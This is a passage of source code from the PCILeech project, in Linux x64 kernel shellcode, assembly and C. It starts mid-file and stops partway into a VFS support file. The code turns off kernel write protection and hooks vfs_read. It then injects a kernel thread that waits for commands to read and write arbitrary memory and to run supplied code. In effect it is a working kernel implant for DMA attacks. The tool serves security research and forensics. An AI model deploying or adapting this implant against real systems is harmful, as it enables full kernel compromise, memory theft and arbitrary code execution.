	LEA r9, hook_shellcode
	hook_fn_patch_loop:
	MOV rax, [r9 + rcx]
	MOV [r8 + rcx], rax
	ADD rcx, 8
	CMP rcx, 32
	JNE hook_fn_patch_loop
	; ----------------------------------------------------
	; 7: CLEAN UP AND EXIT.
	; ----------------------------------------------------
	MOV cr0, r15
	MOV [data_phys_addr_alloc], r13d
	RET
setup_uefi_rt ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; r14 -> kallsyms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	MOV rax, [addr_page_offset_base]
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

m_phys_to_virt PROC
	PUSH rdi
	CALL m_page_offset_base
	POP rdi
	ADD rax, rdi
	RET
m_phys_to_virt ENDP

m_vmemmap_base PROC
	MOV rax, [addr_vmemmap_base]
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

m_page_to_phys PROC
	PUSH rdi
	CALL m_vmemmap_base
	POP rdi
	SUB rdi, rax
	SHR rdi, 7		; PFN
	SHL rdi, 12
	MOV rax, rdi
	RET
m_page_to_phys ENDP

str_kallsyms				db 0, 'kallsyms_lookup_name', 0
str_kthread_create_on_node	db 'kthread_create_on_node', 0
str_alloc_pages_current		db 'alloc_pages_current', 0
str_page_offset_base		db 'page_offset_base', 0
str_vmemmap_base			db 'vmemmap_base', 0
str_vfs_read				db 'vfs_read', 0
str_set_memory_x			db 'set_memory_x', 0
str_wake_up_process			db 'wake_up_process', 0
str_pcileech				db 'pcileech', 0
data_cmpxchg_flag			db 0
data_hook_original_32		dq 0, 0, 0, 0

; ------------------------------------------------------------------
; Hook shellcode (26 bytes) to replace initial bytes of hooked
; function (vfs_read). First call set_memory_x to make target
; executable and then call into target.
; ------------------------------------------------------------------
hook_shellcode PROC
	; push 'vfs_read' 4 args to stack.
	PUSH rdi						; 00 offset, 01 size
	PUSH rsi						; 01 offset, 01 size
	PUSH rdx						; 02 offset, 01 size
	PUSH rcx						; 03 offset, 01 size
	MOV rdi, 8888888888888888h		; 04 offset, 0a size, 06 data_offset
	PUSH rdi						; 0e offset, 01 size (RET address for returning set_memory_x)
	MOV esi, 1						; 0f offset, 05 size
	JMP label_fake + 77777777h		; 14 offset, 05 size, 15 data_offset (call to set_memory_x)
	label_fake:
hook_shellcode ENDP

; -----------------------------------------------------------------------------
; CODE EXECUTED BY 'vfs_read' KERNEL HOOK BELOW
; -----------------------------------------------------------------------------
hook_kernel_fn_landing_point PROC
	; ----------------------------------------------------
	; 1: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	;PUSH rdi		; already pushed by hook shellcode
	;PUSH rsi		; already pushed by hook shellcode
	;PUSH rdx		; already pushed by hook shellcode
	;PUSH rcx		; already pushed by hook shellcode
	PUSH r8
	PUSH r9
	PUSH rbx
	PUSH rbp
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	; ----------------------------------------------------
	; 2: ENABLE SUPERVISOR WRITE
	; ----------------------------------------------------
	MOV rdx, cr0
	MOV rax, rdx
	AND eax, 0fffeffffh
	MOV cr0, rax
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (32 bytes) & SUPERVISOR WRITE
	; ----------------------------------------------------
	XOR rcx, rcx
	MOV r8, [addr_vfs_read]
	LEA r9, data_hook_original_32
	hook_fn_copy_loop:
	MOV rax, [r9 + rcx]
	MOV [r8 + rcx], rax
	ADD rcx, 8
	CMP rcx, 32
	JNE hook_fn_copy_loop
	MOV cr0, rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: CALL SETUP STAGE3 CODE
	; ----------------------------------------------------
	CALL setup_stage3
	; ----------------------------------------------------
	; 6: RESTORE AND JMP BACK TO UNHOOKED FUNCTION
	; ----------------------------------------------------
	skipcall:
	POP r15
	POP r14
	POP r13
	POP r12
	POP rbp
	POP rbx
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	JMP [addr_vfs_read]
hook_kernel_fn_landing_point ENDP

; ----------------------------------------------------
; This code compiles into 53 bytes. This is copied by
; stage3 area by the setup function.
; Linux cannot use the simpler windows stage3 pre code
; since the thread will get stuck without a sleep.
; ----------------------------------------------------
lx64_stage3_pre PROC
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.qwAddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
lx64_stage3_pre ENDP

; ----------------------------------------------------
; clear_8k
; clear 8192 bytes of memory
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
	XOR rax, rax
	MOV ecx, 1024
	CLD
	REP STOSQ [rdi]
	RET
clear_8k ENDP

setup_stage3 PROC
	; ----------------------------------------------------
	; 1: ALLOC PAGES.
	; ----------------------------------------------------
	MOV rdi, 14h
	MOV rsi, 2h
	CALL [addr_alloc_pages_current]
	; ----------------------------------------------------
	; 2: RETRIEVE PHYS/VIRT ADDRESSES OF PAGES.
	; ----------------------------------------------------
	MOV rdi, rax
	CALL m_page_to_phys
	MOV r13, rax
	MOV rdi, r13
	CALL m_phys_to_virt
	MOV r12, rax
	; ----------------------------------------------------
	; 3: SET CODE PAGE TO EXECUTABLE.
	; ----------------------------------------------------
	MOV rdi, r12
	MOV rsi, 2
	CALL [addr_set_memory_x]
	; ----------------------------------------------------
	; 4: CLEAR AND COPY STAGE3 PRE BINARY TO AREA.
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rdi, 64
	copy_stage3_pre_loop:
	SUB rdi, 8
	LEA rax, lx64_stage3_pre
	MOV rax, [rax+rdi]
	MOV rsi, r12
	ADD rsi, 1000h
	ADD rsi, rdi
	MOV [rsi], rax
	TEST rdi, rdi
	JNZ copy_stage3_pre_loop
	; ----------------------------------------------------
	; 5: CREATE THREAD & SET UP DATA AREA.
	; ----------------------------------------------------
	MOV rdi, r12
	ADD rdi, 01000h
	XOR rsi, rsi
	XOR rdx, rdx
	SUB rdx, 1
	LEA rcx, str_pcileech
	CALL [addr_kthread_create_on_node]
	MOV [r12+58h], rax   ; KMDDATA.ReservedKMD
	MOV rax, [addr_kallsyms_lookup_name]
	MOV [r12+10h], rax   ; KMDDATA.AddrKallsymsLookupName
	; ----------------------------------------------------
	; 6: START THREAD.
	; ----------------------------------------------------
	MOV rdi, [r12+58h]
	CALL [addr_wake_up_process]
	; ----------------------------------------------------
	; 7: FINISH!
	; ----------------------------------------------------
	MOV [data_phys_addr_alloc], r13d
	RET
setup_stage3 ENDP

END

```

`pcileech_shellcode/lx64_stage3.asm`:

```asm
; lx64_stage3.asm : assembly to receive execution from stage2 shellcode.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN stage3_c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 1: SAME INITIAL BYTE SEQUENCE AS lx64_stage3_pre.asm
	; ----------------------------------------------------
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.AddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
	; ----------------------------------------------------
	; 2: CALL C CODE
	; ----------------------------------------------------
	LEA rcx, label_main_base - 1000h ; address of data page in parameter 1
	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL stage3_c_EntryPoint
	MOV rsp, r15
	POP r15
	; ----------------------------------------------------
	; 3: RESTORE AND RETURN
	; ----------------------------------------------------
	RET
main ENDP


; ------------------------------------------------------------------
; Lookup function pointers and place them in the supplied struct
; rcx -> address of kallsyms_lookup_name
; rdx -> ptr to FNLX struct 
; ------------------------------------------------------------------
LookupFunctions PROC
	; ----------------------------------------------------
	; 0: SET UP / STORE NV-REGISTERS
	; ----------------------------------------------------
	PUSH r15
	PUSH r14
	PUSH r13
	MOV r15, rcx				; address of kallsyms_lookup_name
	MOV r14, rdx				; ptr to FNLX struct 
	MOV r13, 13*8				; num functions * 8
	; ----------------------------------------------------
	; 1: PUSH FUNCTION NAME POINTERS ON STACK
	; ----------------------------------------------------
	LEA rax, str_msleep
	PUSH rax
	LEA rax, str_alloc_pages_current
	PUSH rax
	LEA rax, str_set_memory_x
	PUSH rax
	LEA rax, str__free_pages
	PUSH rax
	LEA rax, str_memcpy
	PUSH rax
	LEA rax, str_schedule
	PUSH rax
	LEA rax, str_do_gettimeofday
	PUSH rax
	LEA rax, str_walk_system_ram_range
	PUSH rax
	LEA rax, str_iounmap
	PUSH rax
	LEA rax, str_ioremap
	PUSH rax
	LEA rax, str_ktime_get_real_ts64
	PUSH rax
	LEA rax, str_ioremap_nocache
	PUSH rax
	LEA rax, str_getnstimeofday64
	PUSH rax
	; ----------------------------------------------------
	; 2: LOOKUP FUNCTION POINTERS BY NAME
	; ----------------------------------------------------
	lookup_loop:
	SUB r13, 8
	MOV rcx, r15
	POP rdx
	CALL SysVCall
	MOV [r14+r13], rax
	TEST r13, r13
	JNZ lookup_loop
	; ----------------------------------------------------
	; 3: IF 'ioremap' DOES NOT EXIST FALLBACK TO 'ioremap_nocache'
	; ----------------------------------------------------
	MOV rax, [r14+9*8]
	TEST rax, rax
	JNZ lookup_finish
	MOV rax, [r14+11*8]
	MOV [r14+9*8], rax
	; ----------------------------------------------------
	; 4: RESTORE NV REGISTERS AND RETURN
	; ----------------------------------------------------
	lookup_finish:
	POP r13
	POP r14
	POP r15
	RET
LookupFunctions ENDP

str_alloc_pages_current			db		'alloc_pages_current', 0
str_set_memory_x				db		'set_memory_x', 0
str__free_pages					db		'__free_pages', 0
str_memcpy						db		'memcpy', 0
str_schedule					db		'schedule', 0
str_do_gettimeofday				db		'do_gettimeofday', 0
str_page_offset_base			db		'page_offset_base', 0
str_vmemmap_base				db		'vmemmap_base', 0
str_walk_system_ram_range		db		'walk_system_ram_range', 0
str_iounmap						db		'iounmap', 0
str_ioremap						db		'ioremap', 0
str_ioremap_nocache				db		'ioremap_nocache', 0
str_ktime_get_real_ts64			db		'ktime_get_real_ts64', 0
str_getnstimeofday64			db		'getnstimeofday64', 0

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of three (5)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi

	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+2*8+00h] ; 20h stack shadow space + 8h (RET) + 2*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+2*8+08h]
	MOV r9,  [rsp+28h+2*8+10h]

	PUSH r15
	MOV r15, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL rax
	MOV rsp, r15
	POP r15

	POP rsi
	POP rdi
	RET
SysVCall ENDP

; ------------------------------------------------------------------
; Retrieve the PAGE_OFFSET_BASE
; Function uses Linux calling convention.
; rdi -> addr of kallsysms_lookup_name
; rax <- value of PAGE_OFFSET_BASE
; ------------------------------------------------------------------
m_page_offset_base PROC
	MOV rax, rdi
	LEA rdi, str_page_offset_base
	CALL rax
	TEST rax, rax
	JZ kaslr_pg_disable
	MOV rax, [rax]
	RET
	kaslr_pg_disable:
	MOV rax, 0ffff880000000000h
	RET
m_page_offset_base ENDP

; ------------------------------------------------------------------
; Convert a physical address to a virtual address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; rcx -> addr of kallsysms_lookup_name
; rdx -> physical_address
; rax <- virtual_address
; ------------------------------------------------------------------
m_phys_to_virt PROC
	PUSH rdi
	PUSH rsi
	PUSH r15
	MOV rdi, rcx
	MOV r15, rdx
	CALL m_page_offset_base
	ADD rax, r15
	POP r15
	POP rsi
	POP rdi
	RET
m_phys_to_virt ENDP

; ------------------------------------------------------------------
; Retrieve the VMEMMAP_BASE
; Function uses Linux calling convention.
; KASLR of vmemmap_base was introduced in kernel 4.10
; in earlier versions it is fixed to: 0ffffea0000000000h
; rdi -> addr of kallsysms_lookup_name
; rax <- value of VMEMMAP_BASE
; ------------------------------------------------------------------
m_vmemmap_base PROC
	MOV rax, rdi
	LEA rdi, str_vmemmap_base
	CALL rax
	TEST rax, rax
	JZ kaslr_memmap_disable
	MOV rax, [rax]
	RET
	kaslr_memmap_disable:
	MOV rax, 0ffffea0000000000h
	RET
m_vmemmap_base ENDP

; ------------------------------------------------------------------
; Convert a struct_page to to a physical address (Linux)
; Function uses Windows calling convention (rcx = 1st param)
; rcx -> addr of kallsysms_lookup_name
; rdx -> addr of struct page
; rax <- physical address
; ------------------------------------------------------------------
m_page_to_phys PROC
	PUSH rdi
	PUSH rsi
	PUSH rdx
	MOV rdi, rcx
	CALL m_vmemmap_base
	POP rdx
	SUB rdx, rax
	SHR rdx, 7		; PFN
	SHL rdx, 12
	MOV rax, rdx
	POP rsi
	POP rdi
	RET
m_page_to_phys ENDP

; ------------------------------------------------------------------
; Receives callback from walk_system_ram_range for each range.
; rdi -> pfn_start
; rsi -> pfn_size
; rdx -> PKMDDATA
; rax <- 0
; ------------------------------------------------------------------
callback_walk_system_ram_range PROC
	SHL rdi, 12				; convert to bytes
	SHL rsi, 12				; convert to bytes
	MOV rax, [rdx + 028h]	; PKMDDATA->DMAAddrVirtual
	MOV rcx, [rdx + 048h]	; PKMDDATA->_size
	ADD rax, rcx
	MOV [rax], rdi
	MOV [rax+8], rsi
	ADD rcx, 10h
	MOV [rdx + 048h], rcx	; PKMDDATA->_size
	XOR rax, rax
	RET
callback_walk_system_ram_range ENDP

; ------------------------------------------------------------------
; Receives callback from walk_system_ram_range before a memcpy is
; attempted. Validate if whole range is within range
; rdi -> pfn_start (mem_range)
; rsi -> pfn_size  (mem_range)
; rdx -> PKMDDATA
; rax <- 0 (if all in range), 1 (out of range)
; ------------------------------------------------------------------
callback_ismemread_inrange PROC
	SHL rdi, 12				; convert to bytes (mem_range_base)
	SHL rsi, 12				; convert to bytes (mem_range_size)
	MOV r8, [rdx + 040h]	; PKMDDATA->_address (req_base)
	MOV r9, [rdx + 048h]	; PKMDDATA->_size (req_size)
	ADD rsi, rdi			; range (mem_range_top)
	ADD r9, r8				; read  (req_top)
	CMP r8, rdi				; req_base < mem_range_base -> out of range
	JL out_of_range
	CMP r9, rsi
	JG out_of_range			; req_top > mem_range_top -> out of range
	XOR rax, rax
	RET
	out_of_range:
	XOR rax, rax
	INC rax
	RET
callback_ismemread_inrange ENDP

; ----------------------------------------------------
; Flush the CPU cache.
; ----------------------------------------------------
CacheFlush PROC
	WBINVD
	RET
CacheFlush ENDP

END

```

`pcileech_shellcode/lx64_stage3_c.c`:

```c
// lx64_stage3_c.c : stage3 main shellcode.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2016, 2017
// Author: Ulf Frisk, pcileech@frizk.net
//

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

extern QWORD SysVCall(QWORD fn, ...);
extern QWORD LookupFunctions(QWORD qwAddr_KallsymsLookupName, QWORD qwAddr_FNLX);
extern QWORD m_phys_to_virt(QWORD qwAddr_KallsymsLookupName, QWORD pa);
extern QWORD m_page_to_phys(QWORD qwAddr_KallsymsLookupName, QWORD p1);
extern VOID callback_walk_system_ram_range();
extern VOID callback_ismemread_inrange();
extern VOID CacheFlush();

#define LOOKUP_FUNCTION(pk, szFn) (SysVCall(pk->AddrKallsymsLookupName, szFn))

typedef struct _PHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct _TIMEVAL {
	QWORD tv_sec;
	QWORD tv_usec;
} TIMEVAL, *PTIMEVAL;

typedef struct tdFNLX { // VOID definitions for LINUX functions (used in main control program)
	QWORD msleep;
	QWORD alloc_pages_current;
	QWORD set_memory_x;
	QWORD __free_pages;
	QWORD memcpy;
	QWORD schedule;
	QWORD do_gettimeofday;
	QWORD walk_system_ram_range;
	QWORD iounmap;
	QWORD ioremap;
    // optional values below - do not use
    QWORD ktime_get_real_ts64;      // do_gettimeofday alternative if export is missing.
	QWORD _ioremap_nocache;
	QWORD getnstimeofday64;			// do_gettimeofday alternative if export is missing.
	QWORD ReservedFutureUse[19];
} FNLX, *PFNLX;

#define KMDDATA_OPERATING_SYSTEM_LINUX			0x02

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	FNLX fn;						// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

#define KMD_CMD_VOID			0xffff
#define KMD_CMD_COMPLETED		0
#define KMD_CMD_READ			1
#define KMD_CMD_WRITE			2
#define KMD_CMD_TERMINATE		3
#define KMD_CMD_MEM_INFO		4
#define KMD_CMD_EXEC		    5
#define KMD_CMD_READ_VA			6
#define KMD_CMD_WRITE_VA		7

/*
* Tries to allocate 4MB contigious memory. If not possible 2MB will be tried.
* If not possible -> fail.
* -- pk
* -- fRetry = should be set to TRUE on entry to enable retry on fail.
* -- return = ptr to struct page if successful.
*/
QWORD AllocateMemoryDma(PKMDDATA pk, BOOL fRetry)
{
	QWORD i, pStructPages[3], pa[2];
	for(i = 0; i < 2; i++) {
		pStructPages[i] = SysVCall(pk->fn.alloc_pages_current, 0x14, 10);
		pa[i] = pStructPages[i] ? m_page_to_phys(pk->AddrKallsymsLookupName, pStructPages[i]) : 0;
	}
	// success
	if(pa[0] == pa[1] + 0x200000) {
		pk->DMASizeBuffer = 0x400000;
		pk->DMAAddrPhysical = pa[1];
		return pStructPages[1];
	}
	// complete fail
	if(!pa[0] && !pa[1]) {
		return 0;
	}
	// if 2nd attempt - fail if not complete success
	if(!fRetry) {
		for(i = 0; i < 2; i++) {
			if(pStructPages[i]) {
				SysVCall(pk->fn.__free_pages, pStructPages[i], 10);
			}
		}
		return 0;
	}
	// retry for possible complete success
	pStructPages[2] = AllocateMemoryDma(pk, FALSE);
	if(pStructPages[2]) {
		for(i = 0; i < 2; i++) {
			if(pStructPages[i]) {
				SysVCall(pk->fn.__free_pages, pStructPages[i], 10);
			}
		}
		return pStructPages[2];
	}
	// partial success
	if(pStructPages[1]) {
		SysVCall(pk->fn.__free_pages, pStructPages[1], 10);
	}
	pk->DMASizeBuffer = 0x200000;
	pk->DMAAddrPhysical = pa[0];
	return pStructPages[0];
}

BOOL LookupFunctionsEx(PKMDDATA pk)
{
    DWORD i;
    PFNLX pfn = &pk->fn;
    LookupFunctions(pk->AddrKallsymsLookupName, (QWORD)pfn);
    if(!pfn->do_gettimeofday) {
        pfn->do_gettimeofday = pfn->ktime_get_real_ts64;
    }
	if(!pfn->do_gettimeofday) {
		pfn->do_gettimeofday = pfn->getnstimeofday64;
	}
    for(i = 0; i < 10; i++) {
        if(!*(((PQWORD)pfn) + i)) {
            return FALSE;
        }
    }
    return TRUE;
}

// status:
//     1: ready for command
//     2: processing
//     f0000000: terminated
//     f0000000+: error
// op: - see KMD_CMD defines
// result:
//    0: FALSE
//    1: TRUE
// address:
//    physical base address for memory operation
// size:
//    size of memory operation
VOID stage3_c_EntryPoint(PKMDDATA pk)
{
	QWORD pStructPages, qwMM, qw;
	TIMEVAL timeLast, timeCurrent;
	// 0: set up symbols and kmd data
	pk->MAGIC = 0x0ff11337711333377;
	pk->OperatingSystem = KMDDATA_OPERATING_SYSTEM_LINUX;
	if(!LookupFunctionsEx(pk)) {
		pk->_status = 0xf0000001;
		return;
	}
	// 1: allocate memory
	if(0 == (pStructPages = AllocateMemoryDma(pk, TRUE))) {
		pk->_status = 0xf0000002;
		return;
	}
	pk->DMAAddrVirtual = m_phys_to_virt(pk->AddrKallsymsLookupName, pk->DMAAddrPhysical);
	SysVCall(pk->fn.set_memory_x, pk->DMAAddrVirtual, pk->DMASizeBuffer / 4096);
	// 2: main dump loop
	SysVCall(pk->fn.do_gettimeofday, &timeLast);
	while(TRUE) {
		pk->_status = 1;
		SysVCall(pk->fn.schedule); // kernel yield - avoid stuck thread
		if(KMD_CMD_COMPLETED == pk->_op) { // NOP
			SysVCall(pk->fn.do_gettimeofday, &timeCurrent);
			if(timeCurrent.tv_sec > timeLast.tv_sec + 5) {
				SysVCall(pk->fn.msleep, 100); // sleep after 5 seconds
			}
			continue;
		}
		pk->_status = 2;
		if(KMD_CMD_TERMINATE == pk->_op) { // EXIT
			pk->_status = 0xf0000000;
			SysVCall(pk->fn.__free_pages, pStructPages, 10);
			pk->DMAAddrPhysical = 0;
			pk->DMAAddrVirtual = 0;
			pk->_result = TRUE;
			pk->MAGIC = 0;
			pk->_op = KMD_CMD_COMPLETED;
			return;
		}
		if(KMD_CMD_MEM_INFO == pk->_op) { // INFO (physical section map)
			if(pk->fn.walk_system_ram_range) {
				pk->_size = 0;
				pk->_result = (0 == SysVCall(pk->fn.walk_system_ram_range, 0, ~0UL, pk, callback_walk_system_ram_range));
			} else {
				pk->_result = FALSE;
			}
			CacheFlush();
		}
		if(KMD_CMD_EXEC == pk->_op) { // EXEC at start of buffer
			((VOID(*)(PKMDDATA pk, PQWORD dataIn, PQWORD dataOut))pk->DMAAddrVirtual)(pk, pk->dataIn, pk->dataOut);
			pk->_result = TRUE;
		}
		if(KMD_CMD_READ == pk->_op || KMD_CMD_WRITE == pk->_op) { // PHYSICAL MEMORY READ/WRITE
			// qw :: 0 [all in range], 1 [some in range], 0xffffffff [none in range]
			qw = SysVCall(pk->fn.walk_system_ram_range, pk->_address >> 12, pk->_size >> 12, pk, callback_ismemread_inrange);
			if(qw == 1) {
				pk->_result = FALSE;
			} else {
				qwMM = (qw == 0) ?
					m_phys_to_virt(pk->AddrKallsymsLookupName, pk->_address) :
					SysVCall(pk->fn.ioremap, pk->_address, pk->_size);
				if(qwMM) {
					if(KMD_CMD_READ == pk->_op) { // READ
						SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, qwMM, pk->_size);
					} else { // WRITE
						SysVCall(pk->fn.memcpy, qwMM, pk->DMAAddrVirtual, pk->_size);
					}
					if(qw) {
						SysVCall(pk->fn.iounmap, qwMM);
					}
					pk->_result = TRUE;
				} else {
					pk->_result = FALSE;
				}
			}
		}
		if(KMD_CMD_READ_VA == pk->_op) { // READ Virtual Address
			SysVCall(pk->fn.memcpy, pk->DMAAddrVirtual, pk->_address, pk->_size);
			pk->_result = TRUE;
		}
		if(KMD_CMD_WRITE_VA == pk->_op) { // WRITE Virtual Address
			SysVCall(pk->fn.memcpy, pk->_address, pk->DMAAddrVirtual, pk->_size);
			pk->_result = TRUE;
		}
		pk->_op = KMD_CMD_COMPLETED;
		SysVCall(pk->fn.do_gettimeofday, &timeLast);
	}
}
```

`pcileech_shellcode/lx64_stage3_pre.asm`:

```asm
; lx64_stage3_pre.asm : assembly wait loop to wait for continue when executable code exists after.
; Compatible with Linux x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	label_main_base:	
	JMP label_main_loop
	str_msleep db 'msleep', 0
	label_main_loop:
	LEA rdi, str_msleep
	LEA rax, label_main_base-1000h+10h		; KMDDATA.AddrKallsymsLookupName
	MOV rax, [rax]
	CALL rax
	MOV rdi, 100
	CALL rax
	LEA rax, label_main_base-8h
	MOV rax, [rax]
	CMP rax, 0
	JZ label_main_loop
main ENDP

; -----------------------------------------------------------------------------
; This code compiles into 53 bytes. This is copied by
; stage3 area by the setup function.
; Linux cannot use the simpler windows stage3 pre code
; since the thread will get stuck without a sleep.
; -----------------------------------------------------------------------------

END

```

`pcileech_shellcode/lx64_vfs.c`:

```c
// lx64_vfs.c : kernel code to support the PCILeech file system.
// Compatible with Linux x64.
//
// (c) Ulf Frisk, 2017-2021
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel lx64_vfs.c
// ml64 lx64_common_a.asm /Felx64_vfs.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main lx64_vfs.obj lx64_common.obj
// shellcode64.exe -o lx64_vfs.exe
// 

#include "lx64_common.h"

//-----------------------------------------------------------------------------
// Core defines and typedefs shared between kernel implants and pcileech.
//-----------------------------------------------------------------------------

#define VFS_OP_MAGIC				0x79e720ad93aa130f
#define VFS_OP_CMD_LIST_DIRECTORY	1
#define VFS_OP_CMD_WRITE			2
#define VFS_OP_CMD_READ				3
#define VFS_OP_CMD_CREATE			4
#define VFS_OP_CMD_DELETE			5

#define VFS_FLAGS_FILE_NORMAL		0x01
#define VFS_FLAGS_FILE_DIRECTORY	0x02
#define VFS_FLAGS_FILE_SYMLINK		0x04
#define VFS_FLAGS_FILE_OTHER		0x08
#define VFS_FLAGS_UNICODE			0x10
#define VFS_FLAGS_EXIST_FILE		0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE	0x40
#define VFS_FLAGS_APPEND_ON_WRITE	0x80

typedef struct tdVFS_OPERATION {
	QWORD magic;
	QWORD op;
	QWORD flags;
	CHAR szFileName[MAX_PATH];
	WCHAR wszFileName[MAX_PATH];
	QWORD offset;
	QWORD cb;
	BYTE pb[];
} VFS_OPERATION, *PVFS_OPERATION;

typedef struct tdVFS_RESULT_FILEINFO {
	QWORD flags;
	QWORD tAccessOpt;
	QWORD tModifyOpt;
	QWORD tCreateOpt;
	QWORD dbg1;
	QWORD dbg2;
	QWORD cb;
	WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

//-----------------------------------------------------------------------------
// Other required defines and typedefs.
//-----------------------------------------------------------------------------

#define O_RDONLY			00000000
#define O_WRONLY			00000001
#define O_CREAT				00000100
#define O_TRUNC				00001000
#define O_APPEND			00002000
#define O_DIRECTORY			00200000
#define O_NOATIME			01000000

#define DT_UNKNOWN			0
#define DT_FIFO				1
#define DT_CHR				2
#define DT_DIR				4
#define DT_BLK				6
#define DT_REG				8
#define DT_LNK				10
#define DT_SOCK				12
#define DT_WHT				14

#define AT_FDCWD			-100
#define AT_NO_AUTOMOUNT		0x800
#define STATX_BASIC_STATS	0x000007ffU


struct timespec {
	QWORD	tv_sec;		// seconds
	QWORD	tv_nsec;	// nanoseconds
};

